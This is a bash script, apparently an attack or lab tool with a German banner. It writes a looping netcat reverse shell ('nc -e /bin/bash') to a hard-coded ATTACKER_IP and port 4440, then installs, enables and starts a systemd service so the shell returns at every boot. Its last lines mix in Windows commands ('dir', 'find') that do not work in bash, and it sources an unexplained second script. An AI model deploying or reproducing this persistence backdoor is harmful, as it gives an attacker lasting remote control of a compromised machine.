#!/bin/bash
echo "------------------------------------------------"
echo " Root der CS3-Applikationssoftware"
echo "------------------------------------------------"
# Variables
SERVICE_NAME="reverseshell"
SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
SCRIPT_PATH="/usr/local/bin/reverseshell.sh"
ATTACKER_IP="192.168.2.117" 
PORT="4440"

# Create the reverse shell script
echo "Creating the reverse shell script at:"
echo "$SCRIPT_PATH"
sudo rm -rf /usr/local/bin/reverseshell.sh
sudo rm -rf /etc/systemd/system/${SERVICE_NAME}.service
cat << EOF > ${SCRIPT_PATH}
#!/bin/bash
while true; do
  nc -e /bin/bash ${ATTACKER_IP} ${PORT}
  sleep 3
done
EOF

echo "Making the script executable"

# Make the reverse shell script executable
chmod +x ${SCRIPT_PATH}

echo "Creating a sevice for the script"
# Create the systemd service unit file
cat << EOF > ${SERVICE_PATH}
[Unit]
Description=Reverse Shell Service

[Service]
ExecStart=${SCRIPT_PATH}
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd to recognize the new service
echo "reloading the system"
systemctl daemon-reload
echo "setting service to start on boot"
# Enable the service to start on boot
systemctl enable ${SERVICE_NAME}.service
echo "starting the sevice"
# Start the service immediately
systemctl start ${SERVICE_NAME}.service
echo "checking the service"
# Verify the service status
systemctl status ${SERVICE_NAME}.service

dir /usr/local/bin/
dir /etc/systemd/system/
cat /usr/local/bin/reverseshell.sh
cat /etc/systemd/system/${SERVICE_NAME}.service
netstat -an | find "4444"
netstat -an | find "4440"

sleep 100

. paket_src.sh
exit 0
 
